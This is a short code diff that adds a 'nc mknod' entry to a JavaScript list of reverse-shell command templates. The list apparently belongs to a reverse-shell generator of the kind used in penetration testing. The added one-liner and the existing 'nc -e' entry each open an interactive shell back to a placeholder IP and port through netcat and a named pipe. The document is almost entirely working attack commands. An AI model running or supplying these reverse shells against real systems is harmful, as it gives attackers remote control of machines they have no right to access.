@@ -52,6 +52,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
+            "name": "nc mknod",
+            "command": "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
+            "meta": ["linux", "mac"]
+        },
+        {
             "name": "nc -e",
             "command": "nc {ip} {port} -e {shell}",
             "meta": ["linux", "mac"]
